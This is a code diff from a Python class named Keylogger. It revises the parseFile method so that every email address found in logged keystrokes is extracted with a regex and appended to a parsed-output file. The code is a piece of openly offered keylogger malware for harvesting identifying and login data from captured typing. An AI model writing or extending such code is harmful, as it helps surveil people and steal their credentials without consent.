@@ -127,16 +127,21 @@ class Keylogger:
       
     def parseFile(self, line):
         global lineBuffer
-        regex = re.compile(r'[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}')
+        #regex = re.compile(r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-.]{2,3}')
         previous = lineBuffer[len(lineBuffer)//2:] #split string in half and save second half
         lineBuffer = line #save line for next iteration
         line = previous + line #add the half of previous line to current line so regex text isnt cut off
         
         with open ('./log/keylog/parsed.txt', 'a+') as parsed:
-            result = regex.search(line)
+            result = re.findall(  r'[\w\.-]+@[\w.-]+' , line)
             if result:
-                parsed.write(result)
-                print ('regex found: ', result)
+                for email in result:
+                    parsed.write(email)
+                    #write following chararacter and end at space or enter
+                    parsed.write('\n')
+                    print ('regex found: ', email)
+            else:
+                print ('no regex found ')
             parsed.close()
 
     
